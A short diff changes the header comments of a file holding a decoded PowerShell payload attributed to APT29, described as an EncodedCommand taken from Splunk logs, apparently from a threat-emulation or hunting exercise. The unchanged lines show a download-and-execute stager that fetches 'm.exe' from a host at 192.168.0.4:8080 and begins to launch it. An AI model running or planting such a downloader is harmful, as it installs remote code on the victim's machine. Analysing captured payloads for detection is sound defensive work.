@@ -1,5 +1,5 @@
-# Decoded APT29 Day 2 PowerShell payload from Base64 (UTF-16LE)
-# Source: EncodedCommand observed in Splunk logs (Day2)
+# Decoded APT29 Day 1 PowerShell payload from Base64 (UTF-16LE)
+# Source: EncodedCommand observed in Splunk logs (Day1)
 $wc = New-Object System.Net.WebClient;
 $wc.DownloadFile("http://192.168.0.4:8080/m","m.exe");
 $processInfo = New-Object System.Diagnostics.ProcessStartInfo;
